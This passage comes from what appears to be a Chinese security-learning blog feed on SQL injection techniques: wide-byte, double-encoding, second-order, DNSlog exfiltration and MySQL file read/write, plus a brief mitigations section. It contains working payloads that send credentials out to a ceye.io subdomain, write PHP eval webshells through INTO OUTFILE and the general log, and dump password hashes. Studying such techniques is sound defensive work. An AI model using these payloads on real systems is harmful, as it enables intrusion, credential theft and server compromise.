字符集（宽）</h3><p>GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。<em><strong>宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符</strong></em>。</p><h3 id="mysql的字符集转换过程"><a class="markdownIt-Anchor" href="#mysql的字符集转换过程"></a> MySQL的字符集转换过程</h3><ol><li><p>MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection;</p></li><li><p>进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：（一级一级往上升，找到配置）</p><ul><li>使用每个数据字段的CHARACTER SET设定值;</li><li>若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准);</li><li>若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值;</li><li>若上述值不存在，则使用character_set_server设定值。</li></ul></li></ol><p>将操作结果从内部操作字符集转换为character_set_results。</p><p><strong>重点：宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码。</strong></p><h3 id="注入原理"><a class="markdownIt-Anchor" href="#注入原理"></a> 注入原理</h3><blockquote><p>GBK 占用两字节 ASCII占用一字节</p></blockquote><p>PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\”），MYSQL默认字符集是GBK等宽字节字符集。</p><p>大家都知道<code>%df’ </code>被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠<code>\</code>，变成了 <code>%df\’</code>，其中<code>\</code>的十六进制是<code> %5C</code> ，那么现在<code> %df\’ =%df%5c%27</code>，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为<code>%df%5c</code>是一个宽字符，也就是<code>縗</code>，也就是说：<code>%df\’ = %df%5c%27=縗’</code>（单引号逃逸），有了<strong>单引号</strong>就好注入了。</p><blockquote><p>也就是本来是1(23)，其中2用来注释3，但是因为宽字节会变成(12)3，这样3就独立出来了。所以，诀窍是让(12)成为一个可以被解析的宽字符就行。</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select * from user where username=&#x27;$username&#x27;&quot;;   </span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line"><span class="number">-1</span><span class="operator">%</span>df<span class="operator">%</span><span class="number">27</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;table.name&#x27;</span> # (后面的<span class="string">&#x27;&#x27;</span>可以使用<span class="number">16</span>进制编码，编码结束后在前面加上<span class="number">0</span>x)</span><br></pre></td></tr></table></figure><h3 id="常见url编码"><a class="markdownIt-Anchor" href="#常见url编码"></a> 常见URL编码</h3><table><thead><tr><th>URL编码</th><th>注释</th></tr></thead><tbody><tr><td><code>%27</code></td><td>单引号</td></tr><tr><td><code>%20</code></td><td>空格</td></tr><tr><td><code>%23</code></td><td>#号</td></tr><tr><td><code>%5c</code></td><td><code>/</code>反斜杠</td></tr></tbody></table><p>header改为gbk：<code>header(&quot;Content-type:text/html;charset=gbk&quot;);</code></p><h3 id="防御"><a class="markdownIt-Anchor" href="#防御"></a> 防御</h3><ol><li>使用<code>mysql_set_charset(utf8)</code>指定字符集</li><li>使用<code>mysql_real_escape_string</code>进行转义</li></ol><p>这同样也是存在漏洞的，另外官方建议使用mysql_set_charset方式来设置编码，不幸的是它也只是调用了SET NAMES,所以效果也是一样的。不过mysql set_charset调用SET NAMES之后还记录了当前的编码，留着给后面mysql_real_escape_string处理字符串的时候使用，所以在后面只要合理地使用mysql_real_escape_string还是可以解决这个漏洞的，关于这个漏洞的解决方法推荐如下几种方法：</p><ol><li>在执行查询之前先执行SET NAMES’gbk’,character_set_client=-binary设置character set client binary.</li><li>使用mysql_set_charset(‘gbk’)设置编码，然后使用mysql_real_escape_string()函数被参数过滤。</li><li>使用pdo方式，在PHP5.3.6及以下版本需要设置setAttribute (PDO:ATTREMULATE_PREPARES,false);来禁用prepared statements的仿真效果。</li></ol><h2 id="二次编码注入"><a class="markdownIt-Anchor" href="#二次编码注入"></a> 二次编码注入</h2><p>二次编码注入和宽字节注入有着异曲同工之妙，都是在面对PHP代码或者配置，对输入的‘(单引号)进行转义的时候，在处理用户输入的数据时存在问题，绕开了转义。</p><p>这里不是宽字节注入的GBK编码，而是UFT-8，所以宽字节注入不管用。</p><p>重点：<code>%2527</code></p><h3 id="url编码"><a class="markdownIt-Anchor" href="#url编码"></a> URL编码</h3><p>编码肯定是因为原始的格式并不适合传输才进行的，例如<code>+，=，&amp;，;</code>等符号在http请求过程中会与原有格式进行冲突，所以需要进行编码转换。</p><blockquote><p>比如某登录场景：<code>index.php?id=1$name=admin$pwd=123</code>。账号密码中带有=号和&amp;号，就可能导致冲突，这些就需要进行url编码<br />比如：</p><ul><li>编码前：name=admin=</li><li>编码后：name=admin%3d</li></ul><p>通常后端程序会自动进行解码，比如php的<code>urldecode()</code>函数：<code>urldecode('%3d')</code></p></blockquote><h3 id="二次编码"><a class="markdownIt-Anchor" href="#二次编码"></a> 二次编码</h3><p>urldecode()与PHP本身处理编码时，两者配合失误，可以构造数据消灭斜线。</p><ol><li>当输入<code>id=1%27</code>或者<code>id=1’</code>，都会被过滤（加上了<code>\</code>）</li><li>当输入<code>id=1%2527</code>就可以让<code>%25--&gt;%</code>，所以合起来，就会变成<code>%27</code>，刚好能够注入。</li><li><img src="/images/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%A0%86%E5%8F%A0%E3%80%81%E4%BA%8C%E6%AC%A1%E3%80%81DNS%E6%B3%A8%E5%85%A5%E3%80%81%E5%90%84%E4%BD%8D%E7%BD%AE%E6%B3%A8%E5%85%A5%E7%AD%89/image-20230524142550739.png" alt="image-20230524142550739" /></li></ol><h2 id="二阶注入二次注入"><a class="markdownIt-Anchor" href="#二阶注入二次注入"></a> 二阶注入（二次注入）</h2><p>示例是由：创建用户，登录和修改密码组成。</p><p>当我们遇到特殊字符转义的时候（例如：mysql_real_escape_string）</p><blockquote><p>mysql_real_escape_string:</p><p>将转义特殊字符：<code>\x00, \n, \r, \, ', &quot;, \x1a</code></p></blockquote><p>当我们注册的用户名为<code>admin'#</code>，即使转义了，但是在数据库中是存在的，可以直接调出来，修改密码的地方并没有过滤，那么我们可以进行二次注入。</p><p><code>$sql = &quot;UPDATE users SET PASSWORD='$pass' where username='admin '#' and password='$curr_pass'&quot;;</code></p><p>好文章，待会看：</p><blockquote><p>ZZCMS v8.3二阶注入：<a href="https://www.freebuf.com/vuls/183360.html">https://www.freebuf.com/vuls/183360.html</a></p><p>ZoneMinder：<a href="https://www.4hou.com/info/news/19267.html">https://www.4hou.com/info/news/19267.html</a></p><p>Joomla3.8.2：<a href="https://blog.csdn.net/publicStr/article/details/80261667">https://blog.csdn.net/publicStr/article/details/80261667</a></p><p>二次注入漏洞挖掘：<a href="https://www.secpulse.com/archives/76506.html">https://www.secpulse.com/archives/76506.html</a></p><p>二阶注入研究论文：<a href="http://www.doc88.com/p-6931153563831.html">http://www.doc88.com/p-6931153563831.html</a></p></blockquote><h1 id="dns注入盲注dnslog外带"><a class="markdownIt-Anchor" href="#dns注入盲注dnslog外带"></a> DNS注入（盲注DNSlog外带）</h1><blockquote><p><strong>原理</strong>：首先需要有一个可以配置的域名，比如：<a href="http://ceye.io">ceye.io</a>，然后通过代理商设置域名 <a href="http://ceye.io">ceye.io</a> 的 nameserver 为自己的服务器 A，然后再服务器 A 上配置好 DNS Server，这样以来所有 <a href="http://ceye.io">ceye.io</a> 及其子域名的查询都会到 服务器 A 上，<strong>这时就能够实时地监控域名查询请求了</strong>，图示如下</p></blockquote><p><img src="/images/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%A0%86%E5%8F%A0%E3%80%81%E4%BA%8C%E6%AC%A1%E3%80%81DNS%E6%B3%A8%E5%85%A5%E3%80%81%E5%90%84%E4%BD%8D%E7%BD%AE%E6%B3%A8%E5%85%A5%E7%AD%89/image-20230524142924449.png" alt="image-20230524142924449" /></p><h2 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h2><p><strong>DNS在解析的时候会留下日志，咱们这个就是读取多级域名的解析日志，来获取信息简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息</strong>。</p><p>利用场景：在sql注入时为布尔盲注、时间盲注，注入的效率低且线程高容易被waf拦截，又或者是目标站点没有回显，我们在读取文件、执行命令注入等操作时无法明显的确认是否利用成功，且在现代WAF的防护下，很可能导致IP被ban，这时候就要用到我们的DNSlog注入。</p><p>推荐平台：<a href="http://www.dnslog.cn">dnslog</a>, <a href="http://admin.dnslog.link">admindnslog</a>, <a href="http://ceye.io">ceye</a>, <a href="https://github.com/BugScanTeam/DNSLog">BulidDNS</a></p><h2 id="攻击"><a class="markdownIt-Anchor" href="#攻击"></a> 攻击</h2><p>目标使用Mysql：<code>SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.b182oj.ceye.io\\abc'));</code></p><p>前人的payload：</p><ol><li><code>?id=1’ and if((select load_file(concat(’\\\\’,(select database()),’.sojcvo.ceye.io\\aaa’))),1,0)--+</code></li><li><code>?id=1' and if((select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.sojcvo.ceye.io\\aaa'))),1,0)--+</code></li><li><code>?id=1' and if((select load_file(concat('\\\\',(select hex(concat_ws('~',username,password)) from users limit 0,1),'.sojcvo.ceye.io\\abc'))),1,0)-- +</code> 用 concat_ws() 函数分割，因为在 load_file() 里面不能使用 @ ~ 等符号分割，用 hex() 函数转成十六进制，出来结果了再转回去即可。</li></ol><p>然后在ceye.io中看输出。</p><h1 id="各位置注入"><a class="markdownIt-Anchor" href="#各位置注入"></a> 各位置注入</h1><ol><li>提交方式：get/post<ol><li>get只有一次传输</li><li>post传输头得到100 continue后再传data</li></ol></li><li>注入类型：json/数字/字符串</li><li>注入点：<ol><li>Cookie</li><li>Header：User-Agent（）可能存在有数据库的交互，记录在<code>$_SERVER</code>中</li></ol></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;堆叠注入可绕过select用法参考advance&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#堆叠注入可绕过select用法参考advance&quot;&gt;&lt;/a&gt; 堆叠注入（可绕过select）用法参考advance&lt;/h1&gt;
&lt;p&gt;堆叠注入</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="sql注入" scheme="https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入进阶-各种数据库的注入方式</title>
    <link href="https://j3f5.github.io/articles/2023/05/23/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F/"/>
    <id>https://j3f5.github.io/articles/2023/05/23/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F/</id>
    <published>2023-05-23T10:24:39.000Z</published>
    <updated>2023-05-25T01:15:16.457Z</updated>
    
    <content type="html"><![CDATA[<h1 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h1><ul><li>什么决定网站注入点用户权限？<strong>数据库配置文件</strong></li></ul><h2 id="常用数据库"><a class="markdownIt-Anchor" href="#常用数据库"></a> 常用数据库</h2><p>常见的数据库：Access，Mysql，Mssql，mongoDB，postgresql，sqlite，oracle，sybase等</p><p>这些数据库除了Access没有数据库名外，其他都类似，有：<strong>数据库名+表名+列名+数据</strong></p><p>关系型数据库：通过外键关联来建立表与表之间的关系。由二维表及其之间的联系组成的一个数据组织。如：Oracle、DB2、MySql</p><p>非关系型数据库：通常指数据以对象的形式存储在数据库中，而对象之间的关系通过每个对象自身的属性来决定。非关系型数据库产品是传统关系型数据库的功能阉割版本，通过减少用不到或很少用的功能，来大幅度提高产品性能。如：NoSql、Cloudant。</p><h2 id="判断sql注入数据库类型方法"><a class="markdownIt-Anchor" href="#判断sql注入数据库类型方法"></a> 判断sql注入数据库类型方法</h2><ol><li><p>如果可以，直接通过<strong>端口/默认语言</strong>判断</p><ol><li><p>默认语言搭配数据库：</p><p>组合类型asp + access/mssql<br />组合类型php + mysql<br />组合类型aspx+mssql<br />组合类型jsp +mysql/oracle<br />组合类型Python + MongoDB</p></li><li><p>常见数据库的默认端口：</p><ol><li>关系型数据库<br />mysql 3306<br />sqlserver 1433<br />oracle 1521<br />psotgresql 5432</li><li>非关系型数据库<br />MongoDB 27017<br />Redis 6379<br />memcached 11211</li></ol></li></ol></li><li><p>是否可以使用特定的函数来判断，该数据库特有的</p><ol><li>在mssql中可以调用<code>substring</code>。oracle则只可调用<code>substr</code></li><li>mssql不可以调用<code>version()</code></li></ol></li><li><p>是否可以使用辅助的符号来判断，如注释符号、多语句查询符等等</p><ol><li><code>/*</code>是MySQL中的注释符，返回错误说明该注入点不是MySQL；</li><li><code>--</code>是Oracle和MSSQL都支持的，但是<code>;</code>是Oracle不支持的，因为它不支持多行查询。</li></ol></li><li><p>是否可以编码查询</p></li><li><p>是否显可以利用错误信息</p><blockquote><p>例如：错误提示Microsoft JET Database Engine 错误 ‘80040e14’，说明是通过JET引擎连接数据库，则表明数据库为ACCESS数据库，如果是ODBC的话则说明是MSSQL数据库。</p></blockquote></li><li><p>是否存在数据库某些特性辅助判断</p><ol><li>特殊表：access(msysobjects)，mssql(sysobjects)，oracle(sys.user_tables)，mysql(information_schema)</li></ol></li></ol><p>参考：<a href="https://www.jianshu.com/p/e308d96e2ecd">https://www.jianshu.com/p/e308d96e2ecd</a></p><h1 id="mysql"><a class="markdownIt-Anchor" href="#mysql"></a> MYSQL</h1><img src="/images/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F/1621405493318-f8a180c6-8b51-4ff6-8ae6-30ab8b9de48a.png" alt="MYSQL注入.png" style="zoom:80%;" /><h2 id="常见手法"><a class="markdownIt-Anchor" href="#常见手法"></a> 常见手法</h2><ol><li><p>找到注入点 <code>and 1=1</code> <code>and 1=2 </code>测试报错</p></li><li><p><code>order by 5 </code># 到5的时候报错，获取字段总数为4</p></li><li><p><code>id=0</code>(不是1就行，强行报错) <code>union select 1,2,3,4</code> # 联合查询，2和3可以显示信息</p></li><li><p>获取数据库信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">user</span>() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>root</span><br><span class="line">database() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>mozhe_Discuz_StormGroup</span><br><span class="line">version() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span><span class="number">5.7</span><span class="number">.22</span><span class="number">-0</span>ubuntu0<span class="number">.16</span><span class="number">.04</span><span class="number">.1</span></span><br></pre></td></tr></table></figure></li><li><p>获取数据库表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">table_name 表名</span><br><span class="line">information_schema.tables 系统生成信息表</span><br><span class="line">table_schema=数据库名16进制或者用单引号括起来</span><br><span class="line"></span><br><span class="line"># 改变limit 0,1中前一个参数，得到其他表</span><br></pre></td></tr></table></figure></li><li><p>获取列名</p></li><li><p>脱库</p></li></ol><h2 id="信息搜集前面提过"><a class="markdownIt-Anchor" href="#信息搜集前面提过"></a> 信息搜集（前面提过）</h2><p>在mysql的5.0以上版本中，自带一个information_schema数据库名，存储数据库所有的信息，具有表schemata（数据库名）tables（表名）columns（列名字段名）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SCHEMA_NAME字段用来存储数据库名，TABLE_SCHEMA字段用来存储表名，</span><br><span class="line">table_schema和table_name分别来存储数据库名和表名</span><br><span class="line">information_schema.tables 记录所有的表</span><br><span class="line">information_schema.columns 记录所有的列</span><br></pre></td></tr></table></figure><p><strong>MYSQL注入中首先要明确当前注入点权限，高权限注入时有更多的攻击手法，有的能直接进行getshell操作，其中也会遇到很多的阻碍，相关防御手法也要明确，所谓知己知彼，百战不殆。作为安全开发工作者，攻防兼备。</strong></p><p>注入点权限是否为root，取决于连接数据库的文件。这也决定了高权限注入及低权限注入。使用<code>user()</code>进行查看，而且需要注意的是：<em>不是root权限获取不到数据库名。</em></p><h2 id="跨库查询-文件读写以及应用思路"><a class="markdownIt-Anchor" href="#跨库查询-文件读写以及应用思路"></a> 跨库查询、文件读写以及应用思路</h2><h3 id="跨库查询"><a class="markdownIt-Anchor" href="#跨库查询"></a> 跨库查询</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 获取所有数据库名</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata </span><br><span class="line"></span><br><span class="line"># 查表，找与网站对应的数据库名，若没有，则挨个查。或者使用 <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database()</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> <span class="string">&#x27;qqyw&#x27;</span></span><br><span class="line"></span><br><span class="line"># 跨库查列</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;qqyw&#x27;</span></span><br><span class="line"></span><br><span class="line"># 查结果</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,u,p <span class="keyword">from</span> qqyw.admin</span><br></pre></td></tr></table></figure><h3 id="文件读写"><a class="markdownIt-Anchor" href="#文件读写"></a> 文件读写</h3><p>会用到MySQL数据库里两个内置函数，这两个函数是MySQL数据库特有的，在其他数据库是没有的或者在其他数据库中写法不同，所以这是为什么说注入点分数据库的原因，因为每个数据库内置的安全机制和它的功能不同，这才导致在注入的时候针对不用的数据库采取的攻击思路也不同。MySQL有内置读取的操作函数，我们可以调用这个函数作为注入的攻击。</p><p><strong>读取函数</strong>：<code>load_file()</code></p><p><strong>导出函数</strong>：<code>into outfile </code>或<code>into dumpfile</code></p><h4 id="前提"><a class="markdownIt-Anchor" href="#前提"></a> 前提</h4><ol><li><p>应该设置<code>--secure-file-priv</code></p><p>否则会出现如下错误，这是因为MySQL 限制了数据的导出路径。MySQL 导入导出文件只能在<code>secure-file-priv</code>变量的指定路径下的文件才可以导入导出。如果是NULL那就是禁止输出。而如果是空，则不限制目录。</p><blockquote><p><em>The MySQL server is running with the --secure-file-priv option so it cannot execute this statement。</em></p></blockquote></li><li><p>应该对web<strong>目录需要有写权限</strong>，能够使用单引号</p></li><li><p>应该知道<strong>绝对路径</strong></p><p>读取数据库路径：<code>@@datadir</code></p></li></ol><h4 id="文件读取"><a class="markdownIt-Anchor" href="#文件读取"></a> 文件读取</h4><ol><li>只能读取绝对路径的网页文件 读取数据库路径：<code>@@datadir</code></li><li>将绝对路径转换为16进制数时，不需要使用引号</li></ol><p>语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,load_file(&#x27;C:\\inetpub\\wwwroot\\mysql-sql\\inc\\set_sql.php&#x27;),3,4</span><br></pre></td></tr></table></figure><p><strong>然后在网页源码中查看</strong></p><h4 id="文件导出写入到文件"><a class="markdownIt-Anchor" href="#文件导出写入到文件"></a> 文件导出（写入到文件）</h4><ol><li><p>知道路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union select &quot;&lt;?php @eval($_POST[&#x27;123&#x27;]);?&gt;&quot; into outfile(&quot;C:/phpStudy/WWW/a.php&quot;</span><br></pre></td></tr></table></figure></li><li><p>采用PHPmyadmin，选择一个数据库如test，在数据库中<strong>新创建一个表aa</strong>，在aa中<strong>插入一个数据</strong><code>&lt;?php @eval($_POST['123']);?&gt;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select * from aa into outfile &#x27;C:/phpStudy/WWW/a.php&#x27;; --+</span><br></pre></td></tr></table></figure></li></ol><h4 id="路径获取常见方法"><a class="markdownIt-Anchor" href="#路径获取常见方法"></a> 路径获取常见方法</h4><ol><li>报错显示：一般网站出现错误的时候它会泄露出路径；</li><li>遗留文件：站长为了调试信息的时候遗留的文件而泄露的路径。用扫描工具可以扫出；</li><li>漏洞报错：知道对方是用什么程序搭建再去网上去搜索漏洞信息：phpcms 爆路径；</li><li>平台配置文件：通过读取文件来读取搭建网站平台的配置文件。缺点：路径不是默认的，一旦更改很难找到路径；</li><li>爆破；</li></ol><h2 id="魔术引号及常见保护"><a class="markdownIt-Anchor" href="#魔术引号及常见保护"></a> 魔术引号及常见保护</h2><p>php.ini中存在<strong>magic_quotes_gpc</strong>选项，称为魔术引号，此选项打开，使用<code>GET，POST，cookie</code>所接收的<code>'</code>单引号，<code>&quot;</code>双引号，<code>\</code>反斜线和<code>NULL字符</code>全部被加上一个反斜线转义。此时，注入类型是字符型注入已经无法构成威胁。</p><ol><li>编码或宽字节绕过<ol><li>isset无法绕过，则替换关键字</li><li>宽字节绕过<code>0XBF27</code>是两个字符，在PHP中比如<code>addslash</code>和<code>magic_quotes_gpc</code>开启时，由于会对<code>0x27</code>单引号进行转义，因此<code>0xbf27</code>会变成<code>0xbf5c27</code>，而数据进入数据库中时，由于<code>0XBF5C</code>是一个另外的字符，因此<code>\</code>转义符号会被前面的<code>bf</code>带着&quot;<strong>吃掉</strong>&quot;，单引号由此逃逸出来可以用来闭合语句</li></ol></li><li>自定义关键字替换</li></ol><p>其他绕过思路见其他文章</p><h2 id="权限获取"><a class="markdownIt-Anchor" href="#权限获取"></a> 权限获取</h2><h3 id="数据库操作权限获取"><a class="markdownIt-Anchor" href="#数据库操作权限获取"></a> 数据库操作权限获取</h3><p>提权之前需要获得高权限用户，获得高权限Mysql用户可以通过以下方法：</p><ol><li><p>弱口令爆破</p></li><li><p>sqlmap注入的<code>--sql-shell</code>模式</p><p>进入交互界面后，通过<code>select host,user,password from mysql.user</code>这条命令，可以查询数据库的用户和密码。</p></li><li><p>网站的数据库配置文件中拿到明文密码信息。文件名一般都有<code>config</code></p></li><li><p>CVE-2012-2122 等这类漏洞直接拿下 MySQL 权限</p></li></ol><h3 id="webshell获取"><a class="markdownIt-Anchor" href="#webshell获取"></a> Webshell获取</h3><h4 id="into-outfile"><a class="markdownIt-Anchor" href="#into-outfile"></a> into outfile</h4><ul><li><p>知道网站物理路径</p></li><li><p>高权限数据库用户</p></li><li><p><code>load_file()</code>开启 即 <code>secure_file_priv </code>无限制</p><p>可以通过这个查：<code>mysql&gt; show global variables like '%secure_file_priv%';</code></p><table><thead><tr><th>值</th><th>说明</th></tr></thead><tbody><tr><td>NULL</td><td>不允许导入或导出</td></tr><tr><td>/tmp</td><td>只允许在/tmp操作</td></tr><tr><td>空</td><td>不限制目录</td></tr></tbody></table><blockquote><p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p><p>在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p></blockquote></li><li><p>网站路径有写入权限</p></li></ul><p><strong>操作</strong></p><ol><li><pre class="hljs"><code class="bash"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span> into outfile <span class="string">&#x27;/var/www/html/info.php&#x27;</span>;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. ```</span><br><span class="line">   sqlmap -u &quot;http://x.x.x.x/?id=x&quot; --file-write=&quot;/Users/guang/Desktop/shell.php&quot; --file-dest=&quot;/var/www/html/test/shell.php&quot;</span><br></pre></td></tr></table></figure></code></pre></li></ol><h4 id="日志文件写-shell"><a class="markdownIt-Anchor" href="#日志文件写-shell"></a> 日志文件写 shell</h4><ul><li>Web 文件夹宽松权限可以写入</li><li>Windows 系统下</li><li>高权限运行 MySQL 或者 Apache</li></ul><p><strong>日志设置查看</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE &#x27;general%&#x27;;</span><br><span class="line">general_log</span><br><span class="line">general_log_file</span><br><span class="line"># 自定义</span><br><span class="line">set global general_log = &quot;ON&quot;;</span><br><span class="line">set global general_log_file=&#x27;/var/www/html/info.php&#x27;;</span><br><span class="line"># 往日志里面写入 payload</span><br><span class="line">select &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br></pre></td></tr></table></figure><blockquote><p>MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell</p><p><code>general_log</code> 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。</p><p>可以尝试自定义日志文件，并向日志文件里面写入内容的话，那么就可以成功 getshell：</p></blockquote><p>注：</p><ol><li>这里虽然可以成功写入，但是这个 info.php 是 MySQL 创建的 ：</li><li>Apache 访问这个 php 文件会出现 HTTP 500 的状态码，结论是 root 系统这种情况基本上不会成功，只有在 Windows 系统下成功率会高一些</li></ol><h2 id="系统命令执行提权参考国光"><a class="markdownIt-Anchor" href="#系统命令执行提权参考国光"></a> 系统命令执行（提权【参考<a href="https://www.sqlsec.com/2020/11/mysql.html#MSF-%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83">国光</a>】）</h2><h3 id="查询hash解密"><a class="markdownIt-Anchor" href="#查询hash解密"></a> 查询HASH解密</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># MySQL &lt;= 5.6 版本</span><br><span class="line">mysql&gt; select host, user, password from mysql.user;</span><br><span class="line"># MySQL &gt;= 5.7 版本</span><br><span class="line">mysql &gt; select host,user,authentication_string from mysql.user;</span><br></pre></td></tr></table></figure><blockquote><p>也可以通过 Hashcat 来手动跑字典，基本上使用 GPU 破解的话也是可以秒破解的：</p></blockquote><h3 id="udf提权"><a class="markdownIt-Anchor" href="#udf提权"></a> UDF提权</h3><h3 id="反弹端口提权"><a class="markdownIt-Anchor" href="#反弹端口提权"></a> 反弹端口提权</h3><h3 id="mof提权"><a class="markdownIt-Anchor" href="#mof提权"></a> MOF提权</h3><h3 id="启动项提权"><a class="markdownIt-Anchor" href="#启动项提权"></a> 启动项提权</h3><h3 id="cve-2016-66636664组合拳"><a class="markdownIt-Anchor" href="#cve-2016-66636664组合拳"></a> CVE-2016-6663/6664组合拳</h3><h2 id="低版本注入配合读取或暴力-小于50版本"><a class="markdownIt-Anchor" href="#低版本注入配合读取或暴力-小于50版本"></a> 低版本注入配合读取或暴力 小于5.0版本</h2><p>字典或读取，爆破</p><h1 id="access"><a class="markdownIt-Anchor" href="#access"></a> ACCESS</h1><p>access数据库保存在网站源码下面，自己网站数据库独立存在，没有文件读写的操作。</p><p>面对它只能暴力猜解，没有其他办法。</p><ul><li><strong>Access注入时，如果列名或者表名猜解不到的情况怎么办？</strong><ul><li>Access偏移注入：解决列名获取不到的情况。</li></ul></li></ul><ol><li><p>and 1=2 报错找到注入点</p></li><li><p>order by 获取总字段</p></li><li><p>猜解表名 and exists (select * from admin) 页面返回正常，说明存在admin表</p></li><li><p>猜解列名 